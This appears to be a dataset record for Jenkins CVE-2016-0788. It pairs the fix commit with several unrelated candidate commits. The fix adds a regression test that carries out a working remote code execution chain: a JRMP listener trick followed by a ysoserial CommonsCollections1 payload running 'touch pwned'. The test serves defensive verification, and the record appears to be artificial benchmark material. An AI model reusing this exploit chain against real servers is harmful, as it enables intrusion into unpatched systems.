{
  "cve_id": "CVE-2016-0788",
  "cve_desc": "The remoting module in Jenkins before 1.650 and LTS before 1.642.2 allows remote attackers to execute arbitrary code by opening a JRMP listener.",
  "repo": "jenkinsci/jenkins",
  "patch_hash": "1ec232ca1c80e924d70212313b852aec408aa37e",
  "patch_info": {
    "commit_hash": "1ec232ca1c80e924d70212313b852aec408aa37e",
    "repo": "jenkinsci/jenkins",
    "commit_url": "https://github.com/jenkinsci/jenkins/commit/1ec232ca1c80e924d70212313b852aec408aa37e",
    "files": [
      "pom.xml",
      "test/src/test/java/jenkins/security/Security232Test.java"
    ],
    "message": "[FIXED SECURITY-232] Integrating Remoting build with blacklist.",
    "before_after_code_files": [
      "test/src/test/java/jenkins/security/Security232Test.java||test/src/test/java/jenkins/security/Security232Test.java"
    ]
  },
  "patch_diff": {
    "test/src/test/java/jenkins/security/Security232Test.java||test/src/test/java/jenkins/security/Security232Test.java": [
      "File: test/src/test/java/jenkins/security/Security232Test.java -> test/src/test/java/jenkins/security/Security232Test.java",
      "--- Hunk 1 ---",
      "[Context before]",
      "[No context available]",
      "",
      "[Removed Lines]",
      "[None]",
      "",
      "[Added Lines]",
      "1: package jenkins.security;",
      "3: import hudson.remoting.Callable;",
      "4: import hudson.remoting.Channel;",
      "5: import hudson.remoting.Channel.Mode;",
      "6: import hudson.remoting.ChannelBuilder;",
      "7: import hudson.remoting.ClassFilter;",
      "8: import hudson.remoting.JarLoader;",
      "9: import java.io.DataOutputStream;",
      "10: import java.io.File;",
      "11: import java.io.IOException;",
      "12: import java.io.ObjectOutputStream;",
      "13: import java.io.OutputStream;",
      "14: import java.lang.reflect.Constructor;",
      "15: import java.lang.reflect.Field;",
      "16: import java.lang.reflect.InvocationHandler;",
      "17: import java.lang.reflect.Method;",
      "18: import java.lang.reflect.Proxy;",
      "19: import java.net.HttpURLConnection;",
      "20: import java.net.InetSocketAddress;",
      "21: import java.net.Socket;",
      "22: import java.net.URL;",
      "23: import java.net.URLClassLoader;",
      "24: import java.rmi.activation.ActivationDesc;",
      "25: import java.rmi.activation.ActivationID;",
      "26: import java.rmi.activation.ActivationInstantiator;",
      "27: import java.rmi.server.ObjID;",
      "28: import java.rmi.server.RemoteObject;",
      "29: import java.rmi.server.UnicastRemoteObject;",
      "30: import java.util.concurrent.ExecutorService;",
      "31: import java.util.concurrent.Executors;",
      "32: import javax.net.SocketFactory;",
      "33: import static jenkins.security.security218.Payload.CommonsCollections1;",
      "34: import jenkins.security.security218.ysoserial.payloads.CommonsCollections1;",
      "35: import jenkins.security.security218.ysoserial.payloads.ObjectPayload;",
      "36: import static org.junit.Assert.*;",
      "37: import org.junit.Rule;",
      "38: import org.junit.Test;",
      "39: import org.jvnet.hudson.test.Issue;",
      "40: import org.jvnet.hudson.test.JenkinsRule;",
      "41: import sun.reflect.ReflectionFactory;",
      "42: import sun.rmi.server.ActivationGroupImpl;",
      "43: import sun.rmi.server.UnicastRef2;",
      "44: import sun.rmi.server.Util;",
      "45: import sun.rmi.transport.LiveRef;",
      "46: import sun.rmi.transport.TransportConstants;",
      "47: import sun.rmi.transport.tcp.TCPEndpoint;",
      "52: @Issue(\"SECURITY-232\")",
      "53: public class Security232Test {",
      "55:     @Rule",
      "56:     public JenkinsRule r = new JenkinsRule();",
      "58:     @Test",
      "59:     public void commonsCollections1() throws Exception {",
      "60:         File pwned = new File(r.jenkins.getRootDir(), \"pwned\");",
      "62:         int jrmpPort = 12345;",
      "63:         URL u = r.getURL();",
      "65:         HttpURLConnection hc = (HttpURLConnection) u.openConnection();",
      "66:         int clip = Integer.parseInt(hc.getHeaderField(\"X-Jenkins-CLI-Port\"));",
      "68:         InetSocketAddress isa = new InetSocketAddress(u.getHost(), clip);",
      "69:         Socket s = null;",
      "70:         Channel c = null;",
      "71:         try {",
      "72:             System.err.println(\"* Opening socket \" + isa);",
      "73:             s = SocketFactory.getDefault().createSocket(isa.getAddress(), isa.getPort());",
      "74:             s.setKeepAlive(true);",
      "75:             s.setTcpNoDelay(true);",
      "77:             System.err.println(\"* Opening channel\");",
      "78:             OutputStream outputStream = s.getOutputStream();",
      "80:             DataOutputStream dos = new DataOutputStream(outputStream);",
      "82:             dos.writeUTF(\"Protocol:CLI-connect\");",
      "84:             ExecutorService cp = Executors.newCachedThreadPool();",
      "85:             c = new ChannelBuilder(\"EXPLOIT\", cp).withMode(Mode.BINARY).build(s.getInputStream(), outputStream);",
      "87:             System.err.println(\"* Channel open\");",
      "89:             Class<?> reqClass = Class.forName(\"hudson.remoting.RemoteInvocationHandler$RPCRequest\");",
      "91:             Constructor<?> reqCons = reqClass.getDeclaredConstructor(int.class, Method.class, Object[].class);",
      "92:             reqCons.setAccessible(true);",
      "94:             Object getJarLoader = reqCons",
      "95:                     .newInstance(1, Class.forName(\"hudson.remoting.IChannel\").getMethod(\"getProperty\", Object.class), new Object[] {",
      "96:                         JarLoader.class.getName() + \".ours\"",
      "97:             });",
      "99:             Object call = c.call((Callable<Object,Exception>) getJarLoader);",
      "100:             InvocationHandler remote = Proxy.getInvocationHandler(call);",
      "101:             Class<?> rih = Class.forName(\"hudson.remoting.RemoteInvocationHandler\");",
      "102:             Field oidF = rih.getDeclaredField(\"oid\");",
      "103:             oidF.setAccessible(true);",
      "104:             int oid = oidF.getInt(remote);",
      "106:             System.err.println(\"* JarLoader oid is \" + oid);",
      "108:             Constructor<UnicastRemoteObject> uroC = UnicastRemoteObject.class.getDeclaredConstructor();",
      "109:             uroC.setAccessible(true);",
      "110:             ReflectionFactory rf = ReflectionFactory.getReflectionFactory();",
      "111:             Constructor<?> sc = rf.newConstructorForSerialization(ActivationGroupImpl.class, uroC);",
      "112:             sc.setAccessible(true);",
      "113:             UnicastRemoteObject uro = (UnicastRemoteObject) sc.newInstance();",
      "115:             Field portF = UnicastRemoteObject.class.getDeclaredField(\"port\");",
      "116:             portF.setAccessible(true);",
      "117:             portF.set(uro, jrmpPort);",
      "118:             Field f = RemoteObject.class.getDeclaredField(\"ref\");",
      "119:             f.setAccessible(true);",
      "120:             f.set(uro, new UnicastRef2(new LiveRef(new ObjID(2), new TCPEndpoint(\"localhost\", 12345), true)));",
      "122:             Object o = reqCons",
      "123:                     .newInstance(oid, JarLoader.class.getMethod(\"isPresentOnRemote\", Class.forName(\"hudson.remoting.Checksum\")), new Object[] {",
      "124:                         uro,",
      "125:             });",
      "127:             try {",
      "128:                 c.call((Callable<Object,Exception>) o);",
      "129:             }",
      "130:             catch ( Exception e ) {",
      "134:                 e.printStackTrace();",
      "136:                 String msg = e.getMessage();",
      "137:                 int start = msg.indexOf(\"objID:[\");",
      "138:                 if ( start < 0 ) {",
      "139:                     return; // good, got blocked before we even got this far",
      "140:                 }",
      "142:                 int sep = msg.indexOf(\", \", start + 1);",
      "144:                 if ( sep < 0 ) {",
      "145:                     throw new Exception(\"Failed to get object id, separator\");",
      "146:                 }",
      "148:                 int end = msg.indexOf(\"]\", sep + 1);",
      "150:                 if ( end < 0 ) {",
      "151:                     throw new Exception(\"Failed to get object id, separator\");",
      "152:                 }",
      "154:                 String uid = msg.substring(start + 7, sep);",
      "155:                 String objNum = msg.substring(sep + 2, end);",
      "157:                 System.err.println(\"* UID is \" + uid);",
      "158:                 System.err.println(\"* ObjNum is \" + objNum);",
      "160:                 String[] parts = uid.split(\":\");",
      "162:                 long obj = Long.parseLong(objNum);",
      "163:                 int o1 = Integer.parseInt(parts[ 0 ], 16);",
      "164:                 long o2 = Long.parseLong(parts[ 1 ], 16);",
      "165:                 short o3 = Short.parseShort(parts[ 2 ], 16);",
      "167:                 exploit(new InetSocketAddress(isa.getAddress(), jrmpPort), obj, o1, o2, o3, new CommonsCollections1(), \"touch \" + pwned);",
      "168:             }",
      "170:             c.close();",
      "171:         }",
      "172:         finally {",
      "173:             if ( s != null ) {",
      "174:                 s.close();",
      "175:             }",
      "176:         }",
      "178:         Thread.sleep(5000);",
      "180:         assertFalse(\"Pwned!\", pwned.exists());",
      "181:     }",
      "192:     private static void exploit ( InetSocketAddress isa, long obj, int o1, long o2, short o3, ObjectPayload payload, String payloadArg )",
      "193:             throws Exception {",
      "194:         Socket s = null;",
      "195:         try {",
      "196:             System.err.println(\"* Opening JRMP socket \" + isa);",
      "197:             s = SocketFactory.getDefault().createSocket(isa.getAddress(), isa.getPort());",
      "198:             s.setKeepAlive(true);",
      "199:             s.setTcpNoDelay(true);",
      "201:             OutputStream os = s.getOutputStream();",
      "202:             DataOutputStream dos = new DataOutputStream(os);",
      "204:             dos.writeInt(TransportConstants.Magic);",
      "205:             dos.writeShort(TransportConstants.Version);",
      "206:             dos.writeByte(TransportConstants.SingleOpProtocol);",
      "208:             dos.write(TransportConstants.Call);",
      "210:             final ObjectOutputStream objOut = new ObjectOutputStream(dos) {",
      "212:                 protected void annotateClass ( Class<?> cl ) throws IOException {",
      "213:                     if ( ! ( cl.getClassLoader() instanceof URLClassLoader ) ) {",
      "214:                         writeObject(null);",
      "215:                     }",
      "216:                     else {",
      "217:                         URL[] us = ( (URLClassLoader) cl.getClassLoader() ).getURLs();",
      "218:                         String cb = \"\";",
      "219:                         for ( URL u : us ) {",
      "220:                             cb += u.toString();",
      "221:                         }",
      "222:                         writeObject(cb);",
      "223:                     }",
      "224:                 }",
      "230:                 protected void annotateProxyClass ( Class<?> cl ) throws IOException {",
      "231:                     annotateClass(cl);",
      "232:                 }",
      "233:             };",
      "235:             objOut.writeLong(obj);",
      "236:             objOut.writeInt(o1);",
      "237:             objOut.writeLong(o2);",
      "238:             objOut.writeShort(o3);",
      "240:             objOut.writeInt(-1);",
      "241:             objOut.writeLong(Util.computeMethodHash(ActivationInstantiator.class.getMethod(\"newInstance\", ActivationID.class, ActivationDesc.class)));",
      "243:             System.err.println(\"Running \" + payload + \" against \" + ClassFilter.class.getProtectionDomain().getCodeSource().getLocation());",
      "244:             final Object object = payload.getObject(payloadArg);",
      "245:             objOut.writeObject(object);",
      "247:             os.flush();",
      "248:         }",
      "249:         finally {",
      "250:             if ( s != null ) {",
      "251:                 s.close();",
      "252:             }",
      "253:         }",
      "254:     }",
      "256: }",
      "",
      "---------------"
    ]
  },
  "candidates": [
    {
      "candidate_hash": "8713646a47b964f9b25d6eb1f7ee610cc5686404",
      "candidate_info": {
        "commit_hash": "8713646a47b964f9b25d6eb1f7ee610cc5686404",
        "repo": "jenkinsci/jenkins",
        "commit_url": "https://github.com/jenkinsci/jenkins/commit/8713646a47b964f9b25d6eb1f7ee610cc5686404",
        "files": [
          "core/pom.xml",
          "core/src/main/java/hudson/WebAppMain.java",
          "war/src/main/webapp/WEB-INF/web.xml"
        ],
        "message": "[JENKINS-23378] Servlet 3.1\n\nStart declaring servlet 3.1 dependency",
        "before_after_code_files": [
          "core/src/main/java/hudson/WebAppMain.java||core/src/main/java/hudson/WebAppMain.java"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "same_pr": 1,
        "olp_pr_links": [
          "https://github.com/jenkinsci/jenkins/pull/2063"
        ],
        "olp_code_files": {
          "patch": [],
          "candidate": []
        }
      },
      "candidate_diff": {
        "core/src/main/java/hudson/WebAppMain.java||core/src/main/java/hudson/WebAppMain.java": [
          "File: core/src/main/java/hudson/WebAppMain.java -> core/src/main/java/hudson/WebAppMain.java",
          "--- Hunk 1 ---",
          "[Context before]",
          "118:             installLogger();",
          "122:             final FileAndDescription describedHomeDir = getHomeDir(event);",
          "123:             home = describedHomeDir.file.getAbsoluteFile();",
          "",
          "[Removed Lines]",
          "120:             markCookieAsHttpOnly(context);",
          "",
          "[Added Lines]",
          "122:             context.getSessionCookieConfig().setHttpOnly(true);",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "254:         }",
          "255:     }",
          "282:     public void joinInit() throws InterruptedException {",
          "283:         initThread.join();",
          "284:     }",
          "",
          "[Removed Lines]",
          "262:     private void markCookieAsHttpOnly(ServletContext context) {",
          "263:         try {",
          "264:             Method m;",
          "265:             try {",
          "266:                 m = context.getClass().getMethod(\"getSessionCookieConfig\");",
          "267:             } catch (NoSuchMethodException x) { // 3.0+",
          "268:                 LOGGER.log(Level.FINE, \"Failed to set secure cookie flag\", x);",
          "269:                 return;",
          "270:             }",
          "271:             Object sessionCookieConfig = m.invoke(context);",
          "274:             Class scc = Class.forName(\"javax.servlet.SessionCookieConfig\");",
          "275:             Method setHttpOnly = scc.getMethod(\"setHttpOnly\",boolean.class);",
          "276:             setHttpOnly.invoke(sessionCookieConfig,true);",
          "277:         } catch (Exception e) {",
          "278:             LOGGER.log(Level.WARNING, \"Failed to set HTTP-only cookie flag\", e);",
          "279:         }",
          "280:     }",
          "",
          "[Added Lines]",
          "[None]",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "d0bad0f037cfad293faa2b101e0d5b2e41c01f57",
      "candidate_info": {
        "commit_hash": "d0bad0f037cfad293faa2b101e0d5b2e41c01f57",
        "repo": "jenkinsci/jenkins",
        "commit_url": "https://github.com/jenkinsci/jenkins/commit/d0bad0f037cfad293faa2b101e0d5b2e41c01f57",
        "files": [
          "changelog.html"
        ],
        "message": "typo",
        "before_after_code_files": [
          "changelog.html||changelog.html"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "same_pr": 1,
        "olp_pr_links": [
          "https://github.com/jenkinsci/jenkins/pull/2063"
        ],
        "olp_code_files": {
          "patch": [],
          "candidate": []
        }
      },
      "candidate_diff": {
        "changelog.html||changelog.html": [
          "File: changelog.html -> changelog.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "56: <div id=\"trunk\" style=\"display:none\"><!--=TRUNK-BEGIN=-->",
          "57: <ul class=image>",
          "58:   <li class=\"rfe\">",
          "60:     (<a href-\"https://issues.jenkins-ci.org/browse/JENKINS-33068\">issue 33068</a>)",
          "61: </ul>",
          "62: </div><!--=TRUNK-END=-->",
          "",
          "[Removed Lines]",
          "59:     Move periodic task logfiles from <code>JENKINS_HOME/*.log</code> to <code>JENKINS_HOME/logs/tasks/*.log</code> and rotate them periodically rather than overwrite every execution",
          "",
          "[Added Lines]",
          "59:     Move periodic task log files from <code>JENKINS_HOME/*.log</code> to <code>JENKINS_HOME/logs/tasks/*.log</code> and rotate them periodically rather than overwrite every execution",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "f286bc27bd09e7bd5e76783658888bd63fc38a49",
      "candidate_info": {
        "commit_hash": "f286bc27bd09e7bd5e76783658888bd63fc38a49",
        "repo": "jenkinsci/jenkins",
        "commit_url": "https://github.com/jenkinsci/jenkins/commit/f286bc27bd09e7bd5e76783658888bd63fc38a49",
        "files": [
          "core/src/main/java/hudson/WebAppMain.java",
          "war/src/main/webapp/WEB-INF/web.xml"
        ],
        "message": "With servlet 3.0 this is a better place to set this config",
        "before_after_code_files": [
          "core/src/main/java/hudson/WebAppMain.java||core/src/main/java/hudson/WebAppMain.java"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "same_pr": 1,
        "olp_pr_links": [
          "https://github.com/jenkinsci/jenkins/pull/2063"
        ],
        "olp_code_files": {
          "patch": [],
          "candidate": []
        }
      },
      "candidate_diff": {
        "core/src/main/java/hudson/WebAppMain.java||core/src/main/java/hudson/WebAppMain.java": [
          "File: core/src/main/java/hudson/WebAppMain.java -> core/src/main/java/hudson/WebAppMain.java",
          "--- Hunk 1 ---",
          "[Context before]",
          "118:             installLogger();",
          "124:             final FileAndDescription describedHomeDir = getHomeDir(event);",
          "125:             home = describedHomeDir.file.getAbsoluteFile();",
          "126:             home.mkdirs();",
          "",
          "[Removed Lines]",
          "122:             context.getSessionCookieConfig().setHttpOnly(true);",
          "",
          "[Added Lines]",
          "[None]",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "669e1b5b89cf057d44d85120ac24d7d7e3ce3730",
      "candidate_info": {
        "commit_hash": "669e1b5b89cf057d44d85120ac24d7d7e3ce3730",
        "repo": "jenkinsci/jenkins",
        "commit_url": "https://github.com/jenkinsci/jenkins/commit/669e1b5b89cf057d44d85120ac24d7d7e3ce3730",
        "files": [
          "changelog.html"
        ],
        "message": "updated changelog for release",
        "before_after_code_files": [
          "changelog.html||changelog.html"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "same_pr": 1,
        "olp_pr_links": [
          "https://github.com/jenkinsci/jenkins/pull/2063"
        ],
        "olp_code_files": {
          "patch": [],
          "candidate": []
        }
      },
      "candidate_diff": {
        "changelog.html||changelog.html": [
          "File: changelog.html -> changelog.html",
          "--- Hunk 1 ---",
          "[Context before]",
          "58:   <li class=>",
          "59: </ul>",
          "60: </div><!--=TRUNK-END=-->",
          "61: <h3><a name=v1.649>What's new in 1.649</a> (2016/02/21)</h3>",
          "62: <ul class=image>",
          "63:   <li class=\"rfe\">",
          "",
          "[Removed Lines]",
          "[None]",
          "",
          "[Added Lines]",
          "61: <h3><a name=v1.650>What's new in 1.650</a> (2016/02/24)</h3>",
          "62: <ul class=image>",
          "63:   <li class=>",
          "64: </ul>",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "d6bcfdac70bf8b1a8004420f8ce9b7b30ced7159",
      "candidate_info": {
        "commit_hash": "d6bcfdac70bf8b1a8004420f8ce9b7b30ced7159",
        "repo": "jenkinsci/jenkins",
        "commit_url": "https://github.com/jenkinsci/jenkins/commit/d6bcfdac70bf8b1a8004420f8ce9b7b30ced7159",
        "files": [
          "core/src/main/java/hudson/util/XStream2.java",
          "pom.xml"
        ],
        "message": "Integrating newer remoting snapshot, and adding better diagnostics to BlacklistedTypesConverter.",
        "before_after_code_files": [
          "core/src/main/java/hudson/util/XStream2.java||core/src/main/java/hudson/util/XStream2.java"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "same_pr": 1,
        "olp_pr_links": [
          "https://github.com/jenkinsci/jenkins/pull/2063"
        ],
        "olp_code_files": {
          "patch": [],
          "candidate": []
        }
      },
      "candidate_diff": {
        "core/src/main/java/hudson/util/XStream2.java||core/src/main/java/hudson/util/XStream2.java": [
          "File: core/src/main/java/hudson/util/XStream2.java -> core/src/main/java/hudson/util/XStream2.java",
          "--- Hunk 1 ---",
          "[Context before]",
          "440:     private static class BlacklistedTypesConverter implements Converter {",
          "441:         @Override",
          "442:         public void marshal(Object source, HierarchicalStreamWriter writer, MarshallingContext context) {",
          "444:         }",
          "446:         @Override",
          "447:         public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) {",
          "449:         }",
          "451:         @Override",
          "",
          "[Removed Lines]",
          "443:             throw new UnsupportedOperationException(\"Refusing to marshal for security reasons\");",
          "448:             throw new ConversionException(\"Refusing to unmarshal for security reasons\");",
          "",
          "[Added Lines]",
          "443:             throw new UnsupportedOperationException(\"Refusing to marshal \" + source.getClass().getName() + \" for security reasons\");",
          "448:             throw new ConversionException(\"Refusing to unmarshal \" + reader.getNodeName() + \" for security reasons\");",
          "",
          "---------------"
        ]
      }
    }
  ]
}